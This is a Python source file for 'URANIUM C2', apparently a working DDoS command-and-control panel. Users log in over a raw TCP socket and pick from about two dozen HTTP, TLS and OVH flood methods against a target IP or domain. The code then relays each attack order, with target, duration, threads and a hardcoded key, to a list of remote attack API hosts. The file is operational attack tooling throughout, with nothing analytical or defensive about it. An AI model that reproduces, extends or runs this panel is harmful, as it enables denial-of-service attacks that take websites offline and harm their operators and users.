import socket,threading,time,random,json,requests
import hashlib
from MODEL.colors import color_char

c2_icon = f"""        {color_char(196)} ▄• ▄▌{color_char(202)}▄▄▄  {color_char(208)} ▄▄▄· {color_char(214)} ▐ ▄ ▪{color_char(220)}  {color_char(226)}▄• ▄▌{color_char(227)}• ▌ ▄ ·. 
        {color_char(196)} █▪██▌{color_char(202)}▀▄ █·{color_char(208)}▐█ ▀█ {color_char(214)}•█▌▐█ {color_char(220)}█ {color_char(226)}█▪██▌{color_char(227)}·██ ▐███▪
        {color_char(196)} █▌▐█▌{color_char(202)}▐▀▀▄ {color_char(208)}▄█▀▀█ {color_char(214)}▐█▐▐▌{color_char(220)}▐█·{color_char(226)}█▌▐█▌{color_char(227)}▐█ ▌▐▌▐█·
{color_char(196)}█       {color_char(196)} ▐█▄█▌{color_char(202)}▐█•█▌{color_char(208)}▐█ ▪▐▌{color_char(214)}██▐█▌{color_char(220)}▐█▌{color_char(226)}▐█▄█▌{color_char(227)}██ ██▌▐█▌         {color_char(196)}█
 {color_char(197)}▪      {color_char(196)}   ▀▀▀{color_char(202)} .▀  ▀{color_char(208)} ▀  ▀{color_char(214)} ▀▀ █▪{color_char(220)}▀▀▀ {color_char(226)}▀▀▀{color_char(227)} ▀▀  █▪▀▀▀       {color_char(197)}▪
{color_char(198)} ╚━━══════╦═ ════█═════════════════════█════ ═╦══════━━╝
{color_char(199)}    ▀▀██══╩═══════════════════════════════════╩══██▀▀
{color_char(200)}       ▌     {color_char(70)}Type {color_char(226)}"HELP" {color_char(71)}For {color_char(72)}Show {color_char(73)}ALL {color_char(74)}COMMAND     {color_char(200)}▌
{color_char(201)}       ▌    {color_char(51)}- - - {color_char(226)}Powered {color_char(227)}by {color_char(228)}URANIUM-API {color_char(51)}- - -    {color_char(201)}▌
{color_char(207)}     ▄██═━━━ ═█═ ═ ════════════════════ ═ ═█═ ━━━═██▄
{color_char(206)}     ▪ {color_char(128)}copyright {color_char(129)}© {color_char(134)}2023 {color_char(135)}URANIUM {color_char(140)}All {color_char(141)}Right {color_char(146)}Reserved  {color_char(206)}▪"""

methods_icon = f"""         {color_char(196)}▄• ▄▌{color_char(197)}▄▄▄  {color_char(198)} ▄▄▄·{color_char(199)}  ▐ ▄ ▪ {color_char(200)} ▄• ▄▌{color_char(201)}• ▌ ▄ ·. 
         {color_char(196)}█▪██▌{color_char(197)}▀▄ █·{color_char(198)}▐█ ▀█{color_char(199)} •█▌▐███{color_char(200)} █▪██▌{color_char(201)}·██ ▐███▪
         {color_char(196)}█▌▐█▌{color_char(197)}▐▀▀▄ {color_char(198)}▄█▀▀█{color_char(199)} ▐█▐▐▌▐█·{color_char(200)}█▌▐█▌{color_char(201)}▐█ ▌▐▌▐█·
{color_char(220)}█        {color_char(196)}▐█▄█▌{color_char(197)}▐█•█▌{color_char(198)}▐█ ▪▐▌{color_char(199)}██▐█▌▐█▌{color_char(200)}▐█▄█▌{color_char(201)}██ ██▌▐█▌         {color_char(220)}█
{color_char(220)} ▪       {color_char(196)}  ▀▀▀{color_char(197)} .▀  ▀{color_char(198)} ▀  ▀{color_char(199)} ▀▀ █▪▀▀▀ {color_char(200)}▀▀▀ {color_char(201)}▀▀  █▪▀▀▀       {color_char(220)}▪
{color_char(221)} ╚━━══════╦═ ════█═════════════════════█════ ═╦══════━━╝
{color_char(222)}    ▀▀██══╩═══════════════════════════════════╩══██▀▀
          {color_char(70)}TARGET  {color_char(255)}~ {color_char(196)}[{color_char(255)}%s{color_char(196)}]
          {color_char(71)}TIME    {color_char(255)}~ {color_char(197)}[{color_char(255)}%s{color_char(7)}]
          {color_char(72)}THREAD  {color_char(255)}~ {color_char(198)}[{color_char(255)}%s{color_char(198)}]
          {color_char(73)}METHODS {color_char(255)}~ {color_char(199)}[{color_char(255)}%s{color_char(199)}]
{color_char(223)}    ▄▄██══╦═══════════════════════════════════╦══██▄▄
{color_char(224)} ╔━━══════╩═ ════█═════════════════════█════ ═╩══════━━╗
{color_char(225)} ▪                                                     ▪
{color_char(255)}█                                                       █"""
methods_list = f"""{color_char(160)}╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
{color_char(160)}║ {color_char(196)}METHODS             {color_char(197)}TYPE  {color_char(198)}LAYER  {color_char(199)}REQUIRE   {color_char(200)}DESCRIPTION                                           {color_char(160)}║
╠══════════════════╦═══════╦═════╦═════════╦═══════════════════════════════════════════════════════╣
║ {color_char(197)}HTTP_19          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with less option.           {color_char(160)}║
║ {color_char(197)}HTTP_26          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with hybird flood.          {color_char(160)}║
║ {color_char(197)}HTTP_41          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with less line.             {color_char(160)}║
║ {color_char(197)}HTTP_84          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website.                            {color_char(160)}║
║ {color_char(197)}HTTP_170         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding website with all http methods.           {color_char(160)}║
║ {color_char(197)}HTTP_HEX         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with hex.                   {color_char(160)}║
║ {color_char(197)}HTTP_LETTER      {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with 1 letter per path.    {color_char(160)}║
║ {color_char(197)}HTTP_RAP         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with http junk flood.      {color_char(160)}║
║ {color_char(197)}PPS              {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website without HOST header.       {color_char(160)}║
║ {color_char(197)}HTTP_OHIO        {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding https website with weird http flood.     {color_char(160)}║
║ {color_char(197)}OVH_RPS          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding ovh with http methods.                   {color_char(160)}║
║ {color_char(197)}OVH_CONNECT      {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding ovh with connection.                     {color_char(160)}║
║ {color_char(197)}OVH_ALL          {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding with all methods of ovh.                 {color_char(160)}║
║ {color_char(197)}HTTP_ALL         {color_char(160)}║ {color_char(197)}HTTP  {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}IP:PORT {color_char(160)}║{color_char(200)} For flooding http website with all type of http.      {color_char(160)}║
║ {color_char(197)}TLS              {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with all tls version.      {color_char(160)}║
║ {color_char(197)}STRONG           {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with huge ciphers.         {color_char(160)}║
║ {color_char(197)}STRONG2          {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding cf-low website with huge ciphers.        {color_char(160)}║
║ {color_char(197)}AMP_L7           {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with high size of packet.  {color_char(160)}║
║ {color_char(197)}HANDSHAKE        {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with like renegotiate.     {color_char(160)}║
║ {color_char(197)}ORIGINAL_VISITOR {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with high size of packet.  {color_char(160)}║
║ {color_char(197)}BIG_PACKET       {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with huge packet setting.  {color_char(160)}║
║ {color_char(197)}AUTH             {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with auth packet.          {color_char(160)}║
║ {color_char(197)}FORWARDED        {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with forwarded header.     {color_char(160)}║
║ {color_char(197)}RAPID            {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with reset packet not-exp. {color_char(160)}║
║ {color_char(197)}REQEUST_HELL     {color_char(160)}║ {color_char(197)}HTTPS {color_char(160)}║ {color_char(198)}L7  {color_char(160)}║ {color_char(199)}LINK    {color_char(160)}║{color_char(200)} For flooding https website with requests way for atk. {color_char(160)}║
{color_char(160)}╠══════════════════╩═══════╩═════╩═════════╩═══════════════════════════════════════════════════════╣
{color_char(160)}║ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(202)}██ {color_char(196)}█ {color_char(160)}║
{color_char(160)}╚══════════════════════════════════════════════════════════════════════════════════════════════════╝"""

help_command = F"""                               {color_char(70)}╦ ╦{color_char(71)}╔═╗{color_char(72)}╦  {color_char(73)}╔═╗  {color_char(196)}╔═╗╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔╦╗
                            {color_char(220)}▄   {color_char(70)}╠═╣{color_char(71)}║╣ {color_char(72)}║  {color_char(73)}╠═╝  {color_char(197)}║  ║ ║║║║║║║╠═╣║║║ ║║  {color_char(220)}▄
                             {color_char(220)}▪  {color_char(70)}╩ ╩{color_char(71)}╚═╝{color_char(72)}╩═╝{color_char(73)}╩    {color_char(199)}╚═╝╚═╝╩ ╩╩ ╩╩ ╩╝╚╝═╩╝ {color_char(220)}▪
            {color_char(221)}▪              ██ ╚═╦═══════ ██═════════════██ ═══════╦═╝ ██              ▪
             {color_char(221)}╚╦═══════════════╗█╚════     {color_char(129)}MADE {color_char(128)}BY {color_char(127)}HEX1629     {color_char(221)}════╝█╔═══════════════╦╝
             {color_char(222)}█╚═╦═════════════╝█                                   █╚═════════════╦═╝█
            {color_char(223)} █╔═╩═════════════════════════════════════════════════════════════════╩═╗█
             {color_char(223)} ║ {color_char(208)}NAME              {color_char(202)}DESCRIPTION                                       {color_char(223)}║
             {color_char(223)} ╠═════════════════╦═══════════════════════════════════════════════════╣
             {color_char(223)} ║ {color_char(209)}MENU            {color_char(223)}║ {color_char(203)}SHOW MENU                                         {color_char(223)}║
              {color_char(223)}╠═════════════════╬═══════════════════════════════════════════════════╣
{color_char(57)}            ██{color_char(224)}║ {color_char(210)}CLEAR/CLS       {color_char(224)}║ {color_char(204)}FOR CLEAR ALL TEXT IN SCREEN                      {color_char(224)}║{color_char(57)}██
{color_char(57)}          ██  {color_char(224)}╠═════════════════╬═══════════════════════════════════════════════════╣  {color_char(57)}██
{color_char(57)}        ██  ██{color_char(224)}║ {color_char(211)}TCP,HTTP        {color_char(224)}║ {color_char(205)}FOR TEST TARGET IT ONLINE OR NOT ONLINE           {color_char(224)}║{color_char(57)}██  ██
{color_char(56)}      ██  ██  {color_char(224)}╠═════════════════╬═══════════════════════════════════════════════════╣  {color_char(56)}██  ██
{color_char(56)}    ██  ██  ██{color_char(225)}║ {color_char(212)}METHODS         {color_char(225)}║ {color_char(206)}FOR SHOW METHODS                                  {color_char(225)}║{color_char(56)}██  ██  ██
{color_char(55)}  ██  ██  ██  {color_char(225)}╠═════════════════╬═══════════════════════════════════════════════════╣  {color_char(55)}██  ██  ██
{color_char(55)}██  ██  ██  ██{color_char(225)}║ {color_char(213)}EXIT/LOGOUT     {color_char(225)}║ {color_char(207)}FOR EXIT FROM URANIUM C2                          {color_char(225)}║{color_char(55)}██  ██  ██  ██
             {color_char(225)}╔╩═════════════════╩═══════════════════════════════════════════════════╩╗"""

port = 1
def server_builder():
 global port
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 while True:
   try:
    s.bind(('0.0.0.0',port))
    break
   except:port += 1
 print(port)
 s.listen()
 while True:
  client_socket,address = s.accept()
  threading.Thread(target=handshake,args=(client_socket,address)).start()

c2 = socket.gethostbyname(socket.gethostname()).split('.')
c = random.randint(1, random.randint(3, 4))
total = 0
ip = ''

for a in c2:
  total += 1
  if c == total:pass
  else:a = 'x' * len(a)
  ip += a + '.'
  if total == 4:
   if ip.endswith('.'):ip = ip[:-1]

def handshake(client_socket,address):
 address =address[0]
 client_socket.send(f"\33]0;Handshake Server - {ip}\a".encode())
 loading_string = ['\\','|','/','-']
 for _ in range(random.randint(2,15)):
  for string in loading_string:
    send_packet(client_socket,f'{color_char(76)}{address} {color_char(226)}---> {color_char(227)}{ip}:{port} {color_char(228)}[ {string} ]',same_line=True,remove_=True)
    time.sleep(0.1)
 send_packet(client_socket,f'{color_char(76)}{address} {color_char(77)}<--- {color_char(78)}{ip}:{port} {color_char(79)}[ DONE ]',end=True,same_line=True,remove_=True)
 time.sleep(1)
 threading.Thread(target=login,args=(client_socket,0)).start()

def hash_create(text):
 h = hashlib.new('sha256')
 h.update(text.encode())
 return h.hexdigest()

def send_packet(client_socket,data,end=False,remove_=False,same_line=False,ex=False):
 try:
  if remove_==True:
    data+='\x1b[0m'
  if same_line==True:
    data = '\r\x1b[0;m'+data+'\033[K'
  if end==True:
    data+='\n'
  if ex==True:
   data+='\r\n'
  d = data.encode()
  client_socket.send(d)
 except:pass

def login(client_socket,junk):
  try:
   send_packet(client_socket,f"\33]0;LOGIN - URANIUM C2\a")
   SEND_1 = 0
   SEND_2 = 0
   while 1:
    if SEND_1 == 0:SEND_1 = 1
    send_packet(client_socket,f'\r {color_char(76)}U{color_char(77)}s{color_char(78)}e{color_char(79)}r{color_char(80)}n{color_char(81)}a{color_char(86)}m{color_char(87)}e {color_char(51)}$\x1b[0m {color_char(33)}')
    username = client_socket.recv(65536).decode().strip()
    if not username:continue
    break
   while 1:
    if SEND_2 == 0:SEND_2 = 1
    send_packet(client_socket,f'\r {color_char(76)}P{color_char(77)}a{color_char(78)}s{color_char(79)}s{color_char(80)}w{color_char(81)}o{color_char(86)}r{color_char(87)}d {color_char(51)}$\x1b[0m {color_char(33)}')
    password = client_socket.recv(65536).decode().strip()
    if not password:continue
    break
   c = 0
   with open('login.json','r') as f:
    content = json.loads(f.read())
    content2 = content['USERNAME'].keys()
    for k in content2:
     if hash_create(username) == hash_create(k):
      if hash_create(password) == hash_create(content['USERNAME'][username]):
       send_packet(client_socket,f'{color_char(76)}A{color_char(77)}L{color_char(78)}L{color_char(79)}O{color_char(80)}W '.encode(),remove_=True,ex=True)
       time.sleep(1)
       send_packet(client_socket,f'\033[2J\033[H')
       c = 1
       break
   if c == 1:
    threading.Thread(target=title,args=(client_socket,junk,username,password)).start()
    threading.Thread(target=cnc,args=(client_socket,junk,username)).start()
   else:
    send_packet(client_socket,f"\33]0;LOGIN - URANIUM C2 [ FAILED ]\a")
    send_packet(client_socket,f'{color_char(196)}NOT {color_char(197)}FOUND {color_char(198)}LOGIN {color_char(200)}. . .',remove_=True,ex=True)
  except Exception as e:print(e)
command = ''
apis_counting = 0
apis_online = 0
apis_offline = 0

def api_get():
 global apis_counting,apis_offline,apis_online
 with open("Apis/apis.lst",'r') as f:
  for a in f.readlines():
   apis = a.replace('\n','')
   threading.Thread(target=api_req,args=(apis,0)).start()

def api_req(apis,junk):
   global apis_counting,apis_offline,apis_online
   apis_counting += 1
   try:
    r = requests.get('https://'+apis+'/')
    apis_online += 1
   except:apis_offline += 1

threading.Thread(target=api_get).start()

def update_badges(json_data, username, new_badges):
  if username in json_data['USERNAME']:
    json_data['CONFIG'][username]['BADGES'] = new_badges

def title(client_socket,address,username,password):
  global command,apis_counting,apis_offline,apis_online
  xxx_password = 'x' * len(password)
  while True:
   if command == '' or command == None:
    loading = ['\\','|','/','-']
    for l in loading:
     send_packet(client_socket,f"\33]0;[ {l} ] CURRENT API {apis_counting} ONLINE={apis_online} OFFLINE={apis_offline} | URANIUM.C2 | LOGIN --> {username}:{xxx_password}\a")
     time.sleep(0.1)
   if command.split(' ')[0] == 'BADGES': # BADGES
    if username == command.split(' ')[1]:
     with open('login.json', 'r') as file:
        c = file.read().rstrip()
     json_data = json.loads(c)
     id = command.split(' ')[2]

     cache_id = ''
     c = 0
     cache = json_data['CONFIG'][username]['BADGES']
     for id2 in json_data['CONFIG'][username]['BADGES'].split(' '):
        c += 1
        if str(c) == id:
         if id2 == str(0):
          id2 = '1'
        cache_id += id2+' '
     if cache_id.endswith(' '):
      cache_id = cache_id.rstrip()
     update_badges(json_data, username, cache_id)
     cache2 = json_data['CONFIG'][username]['BADGES']

     if cache2 != cache:
      with open('login.json', 'w') as file:
        send_packet(client_socket,f"\33]0; BADGES GOT --> {username}\a")
        time.sleep(1)
        json.dump(json_data, file, indent=2)
     command = ''

def apis_flooder_http(ip,port,times,threader,methods,meth_http):
 with open("Apis/apis.lst",'r') as f:
  for a in f.readlines():
   apis = a.replace('\n','')
   head = {'Port-Target':port,"Method-Http":meth_http}
   threading.Thread(target=api_req2,args=(apis,ip,times,threader,methods,head)).start()

def apis_flooder_https(protocol,link,times,threader,methods,meth_http):
 with open("Apis/apis.lst",'r') as f:
  for a in f.readlines():
   apis = a.replace('\n','')
   head = {'Protocol-Target':protocol,"Method-Http":meth_http}
   threading.Thread(target=api_req2,args=(apis,link,times,threader,methods,head)).start()

def api_req2(apis,target,times,threads,meth,header):
   try:
    r = requests.get('https://'+apis+f'/target={target}&time={times}&thread={threads}&method={meth.replace("_","-")}&key=hex1629',headers=header)
   except:pass

def cnc(client_socket,address,username):
 global command
 command = f'BADGES {username} 1'
 for x in c2_icon.split('\n'):
  send_packet(client_socket,x,ex=True)
  time.sleep(0.1)
 prompt = f'{color_char(70)}U{color_char(71)}R{color_char(72)}A{color_char(73)}N{color_char(74)}I{color_char(75)}U{color_char(39)}M{color_char(256)}@{color_char(196)}{username} {color_char(226)}$ {color_char(51)}'
 send_packet(client_socket,prompt)
 while 1:
  data = client_socket.recv(9999999).decode().strip()
  if not data:
    continue
  commands = data.split(' ')
  COM = commands[0].upper()
  if len(data) == 9999999:
   command = f'BADGES {username} 3'
  
  if COM == 'BADGES':
   block = f"{color_char(196)}╔════════════════════════════════════════════════════════════════╗\n║ {color_char(202)}NAME               {color_char(203)}DESCRIPTION                                 {color_char(196)}║\n╠══════════════════╦═════════════════════════════════════════════╣\n"
   with open('login.json', 'r') as file:
        c = file.read().rstrip()
   json_data = json.loads(c)
   count = 0
   see = []
   if str(username) in json_data['CONFIG']:
        c = json_data['CONFIG'][str(username)]['BADGES'].split(" ")
        
   for a in c:
    count += 1
    if a == str(1):
     see.append(count)
   length_des = 43
   length_name = 16
   end_count = 0
   for a2 in see:
    end_count += 1
    name = json_data['BADGES'][str(a2)]['NAME']
    len_name = len(name)
    string_name = name + str(" " *int(length_name-len_name))
    name2 = json_data['BADGES'][str(a2)]['DESCRIPTION']
    len_name2 = len(name2)
    string_des = name2 + str(" "*int(length_des-len_name2))
    block += f'{color_char(196)}║ {color_char(220)}{string_name} {color_char(196)}║ {color_char(221)}{string_des} {color_char(196)}║\n'
    if end_count != len(see):
     block += f'{color_char(196)}╠══════════════════╬═════════════════════════════════════════════╣\n'
   block += f'{color_char(196)}╠══════════════════╩═════════════════════════════════════════════╣\n║                {color_char(226)}- -  {color_char(227)}- - {color_char(200)}URANIUM {color_char(201)}BADGES {color_char(227)}- -  {color_char(226)}- -                {color_char(196)}║\n╚════════════════════════════════════════════════════════════════╝\n'
   for x in block.split('\n'):
    send_packet(client_socket,x,ex=True)
    time.sleep(0.1) 
  elif COM == 'CLS':
   send_packet(client_socket,'\033[2J\033[H')
   for x in c2_icon.split('\n'):
    send_packet(client_socket,x,ex=True)
    time.sleep(0.1)
  elif COM == 'HTTP_19' or COM == 'HTTP_26' or COM == 'HTTP_41' or COM == 'HTTP_84' or COM == 'HTTP_ALL' or COM == 'HTTP_OHIO' or COM == 'PPS' or COM == 'HTTP_LETTER' or COM == 'HTTP_RAP' or COM == 'HTTP_HEX' or COM == 'HTTP_170':
   if len(commands) == 6:
    ip = commands[1]
    port = commands[2]
    times = int(commands[3])
    if 4500 > times:
     command = f'BADGES {username} 2'
    threader = commands[4]
    meth_http = commands[5]
    count = 0
    for a in methods_icon.split('\n'):
     count += 1
     if count == 8:send_packet(client_socket,a%(f'{ip}:{port}'),ex=True)
     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
     else:send_packet(client_socket,a,ex=True)
    threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,meth_http)).start()
   else:
    send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
  elif COM == 'OVH_RPS' or COM == 'OVH_CONNECT' or COM == 'OVH_ALL':
   if len(commands) == 5:
    ip = commands[1]
    port = commands[2]
    times = int(commands[3])
    if 4500 > times:
     command = f'BADGES {username} 2'
    threader = commands[4]
    count = 0
    for a in methods_icon.split('\n'):
     count += 1
     if count == 8:send_packet(client_socket,a%(f'{ip}:{port}'),ex=True)
     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
     else:send_packet(client_socket,a,ex=True)
    threading.Thread(target=apis_flooder_http,args=(ip,port,times,threader,COM,'GET')).start()
   else:
    send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}IP{color_char(71)}> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}>',remove_=True,ex=True)
  elif COM == 'TLS' or COM == 'REQUEST_HELL' or COM == 'RAPID' or COM == 'STRONG' or COM == 'STRONG2' or COM == 'AMP_L7' or COM == 'HANDSHAKE' or COM == 'ORIGINAL_VISITOR' or COM == 'AUTH' or COM == 'BIG_PACKET' or COM == 'FORWARDED':
   if len(commands) == 6:
    protocol = commands[1]
    if protocol != "https" or protocol != "http":
     protocol = "http"
    domain = commands[2]
    times = int(commands[3])
    if 4500 > times:
     command = f'BADGES {username} 2'
    threader = commands[4]
    meth_http = commands[5]
    count = 0
    for a in methods_icon.split('\n'):
     count += 1
     if count == 8:send_packet(client_socket,a%(f'{protocol}://{domain}'),ex=True)
     elif count == 9:send_packet(client_socket,a%(str(times)),ex=True)
     elif count == 10:send_packet(client_socket,a%(str(threader)),ex=True)
     elif count == 11:send_packet(client_socket,a%(COM),ex=True)
     else:send_packet(client_socket,a,ex=True)
    threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
   else:
    send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}PROTOCOL{color_char(71)}> {color_char(71)}<{color_char(255)}DOMAIN{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}> {color_char(71)}<{color_char(255)}THREAD{color_char(71)}> {color_char(71)}<{color_char(255)}METHODS_HTTP{color_char(71)}>',remove_=True,ex=True)
  elif COM == 'H' or COM == 'HELP' or COM == '?' or COM == '?H':
   if COM == '?H':
    command = f'BADGES {username} 6'
   for x in help_command.split('\n'):
    send_packet(client_socket,x,ex=True)
    time.sleep(0.1)
  elif COM == 'EXIT' or COM == 'LOGOUT':
   command = f'BADGES {username} 6'
   client_socket.close()
  elif COM == 'MENU':
   for x in c2_icon.split('\n'):
    send_packet(client_socket,x,ex=True)
    time.sleep(0.1)
  elif COM == 'TCP':
   command = f'BADGES {username} 4'
   if len(commands) == 4:
    link = commands[1]
    port = int(commands[2])
    bo = commands[3]
    for _ in range(int(bo)):
      try:
       r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       r.connect((link,int(port)))
       r.connect_ex((link,int(port)))
       r.send(b'')
       r.recv(1)
       r.close()
       send_packet(client_socket,f'{color_char(70)}{link}:{port} {color_char(71)}Status=online',remove_=True,ex=True)
      except:send_packet(client_socket,f'{color_char(196)}{link}:{port} {color_char(197)}Status=timeout',remove_=True,ex=True)
   else:
    send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}TARGET> {color_char(71)}<{color_char(255)}PORT{color_char(71)}> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}>',ex=True)
  elif COM == 'HTTP':
   command = f'BADGES {username} 4'
   if len(commands) == 3:
    link = commands[1]
    bo = commands[2]
    for _ in range(int(bo)):
      try:
       r = requests.get(link)
       send_packet(client_socket,f'{color_char(70)}{link} {color_char(71)}Status={r.status_code}',remove_=True,ex=True)
      except:
       send_packet(client_socket,f'{color_char(196)}{link} {color_char(197)}Status=timeout',remove_=True,ex=True)
   else:
    send_packet(client_socket,f'{color_char(70)}{COM} {color_char(71)}<{color_char(255)}https://TARGET> {color_char(71)}<{color_char(255)}TIMES{color_char(71)}>',ex=True)
  elif COM == 'METHODS':
   for x in methods_list.split('\n'):
    send_packet(client_socket,x,ex=True)
    time.sleep(0.1)
  elif COM == 'SUDPANG!' or COM == 'BHBNEDBT6G4' or COM == '/WATCH?v=BHBNEDBT6G4':
   command = f'BADGES {username} 5'
  else:send_packet(client_socket,f'{color_char(196)}Not {color_char(197)}Found {color_char(198)}Command',ex=True)
   
  send_packet(client_socket,prompt)
threading.Thread(target=server_builder).start()
